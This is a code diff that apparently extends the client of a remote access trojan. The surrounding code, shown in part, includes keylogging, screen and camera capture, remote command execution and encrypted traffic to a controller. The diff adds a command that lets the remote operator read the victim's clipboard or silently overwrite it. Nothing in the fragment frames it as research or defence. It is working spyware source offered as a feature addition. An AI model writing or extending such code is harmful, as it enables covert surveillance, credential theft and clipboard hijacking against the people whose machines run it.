@@ -13,6 +13,7 @@ import multiprocessing
 import mss
 import cv2
 import pynput
+import clipboard
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
 
@@ -55,6 +56,10 @@ class Client:
                 self.exit = True
             elif request["cmd"] == "k":
                 self.log_keys(self.response, request["action"], request["save_path"])
+                self.connection.send(self.response)
+            elif request["cmd"] == "b":
+                process = multiprocessing.Process(target=self.edit_clipboard, args=(self.response, request["content"],))
+                self.handle_process(process, request["timeout"])
                 self.connection.send(self.response)
 
     def execute_command(self, response, command):
@@ -138,6 +143,13 @@ class Client:
                 response["data"] = "started"
             else:
                 response["data"] = "stopped"
+
+    def edit_clipboard(self, response, content):
+        if content:
+            clipboard.copy(content)
+            response["data"] = ""
+        else:
+            response["data"] = clipboard.paste()
 
     def handle_process(self, process, timeout):
         process.start()
